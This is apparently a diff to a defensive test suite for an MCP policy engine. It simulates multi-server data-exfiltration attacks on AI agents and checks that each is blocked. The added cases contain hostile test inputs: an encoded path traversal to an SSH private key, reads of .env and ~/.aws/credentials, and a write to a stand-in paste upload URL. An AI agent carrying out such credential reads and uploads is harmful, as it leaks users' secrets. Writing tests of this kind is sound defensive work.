@@ -52,7 +52,7 @@ async def _drain_tasks() -> None:
 CASES = [
     ("MPS-029", "Gradual escalation",                     2),
     ("MPS-043", "Data staging via sampling",              3),
-    ("MPS-044", "Cascade attack",                         2),
+    ("MPS-044", "Read then external upload",              1),
     ("MPS-047", "Below window size (14-read)",           14),
     ("MPS-050", "Multi-server data read sequence",        2),
     ("MPS-052", "Filesystem write-after-read",            1),
@@ -62,9 +62,9 @@ CASES = [
     ("MPS-065", "Resource-to-sampling exfiltration",      2),
     ("MPS-067", "Sampling after tool sequence",           3),
     ("MPS-069", "Slow-burn sampling (10-read)",          10),
-    ("MPS-076", "Sequential sampling buildup variation",  2),
-    ("MPS-077", "Data staging pattern variation",         2),
-    ("MPS-079", "Tool sequence sampling variation",       3),
+    ("MPS-076", "Encoded traversal to SSH key",           2),
+    ("MPS-077", "Sensitive read hidden among docs",       2),
+    ("MPS-079", "Tool pipeline on cloud credentials",     3),
 ]
 
 
@@ -123,7 +123,7 @@ async def _simulate_cross_server_attack(
         await _drain_tasks()
         return not result.allowed
 
-    elif case_id in ("MPS-064", "MPS-076"):
+    elif case_id == "MPS-064":
         # 3 sampling calls: 2 on Server A, 3rd on Server B
         engine.evaluate(_req("sampling/createMessage", {}), session_A)
         engine.evaluate(_req("sampling/createMessage", {}), session_A)
@@ -134,10 +134,50 @@ async def _simulate_cross_server_attack(
         await _drain_tasks()
         return not result.allowed
 
-    elif case_id in ("MPS-067", "MPS-079"):
+    elif case_id == "MPS-067":
         # Tool sequence then sampling: 3 tool calls on Server A, sampling on Server B
         for tool in ["get_data", "format_data", "analyze"]:
             engine.evaluate(_req("tools/call", {"name": tool, "arguments": {}}), session_A)
+        await _drain_tasks()
+        session_B = await _get_session(store, session_id_B)
+        session_B.verified_capabilities = ["resources", "sampling", "tools"]
+        result = engine.evaluate(_req("sampling/createMessage", {}), session_B)
+        await _drain_tasks()
+        return not result.allowed
+
+    elif case_id == "MPS-044":
+        # Read on Server A, write to an external URL on Server B (filesystem-server rule)
+        session_A.server_id = "filesystem-server"
+        engine.evaluate(_req("tools/call", {"name": "read_file", "arguments": {"path": "docs/quarterly_report.md"}}), session_A)
+        await _drain_tasks()
+        session_B = await _get_session(store, session_id_B)
+        session_B.verified_capabilities = ["resources", "sampling", "tools"]
+        session_B.server_id = "filesystem-server"
+        result = engine.evaluate(_req("tools/call", {"name": "write_file", "arguments": {"path": "https://paste.example.com/api/upload"}}), session_B)
+        await _drain_tasks()
+        return not result.allowed
+
+    elif case_id in ("MPS-076", "MPS-077"):
+        # Two resource reads on Server A (one sensitive), sampling on Server B
+        uris = {
+            "MPS-076": ["file:///home/dev/project/docs/%2e%2e/%2e%2e/.ssh/id_rsa", "file:///home/dev/project/README.md"],
+            "MPS-077": ["file:///workspace/docs/api_v1.md", "file:///workspace/.env"],
+        }[case_id]
+        for uri in uris:
+            engine.evaluate(_req("resources/read", {"uri": uri}), session_A)
+        await _drain_tasks()
+        session_B = await _get_session(store, session_id_B)
+        session_B.verified_capabilities = ["resources", "sampling", "tools"]
+        result = engine.evaluate(_req("sampling/createMessage", {}), session_B)
+        await _drain_tasks()
+        return not result.allowed
+
+    elif case_id == "MPS-079":
+        # Tool pipeline over cloud credentials on Server A, sampling on Server B
+        for tool, args in [("get_data", {"source": "~/.aws/credentials"}),
+                           ("format_data", {"format": "table"}),
+                           ("analyze", {"metric": "summary"})]:
+            engine.evaluate(_req("tools/call", {"name": tool, "arguments": args}), session_A)
         await _drain_tasks()
         session_B = await _get_session(store, session_id_B)
         session_B.verified_capabilities = ["resources", "sampling", "tools"]
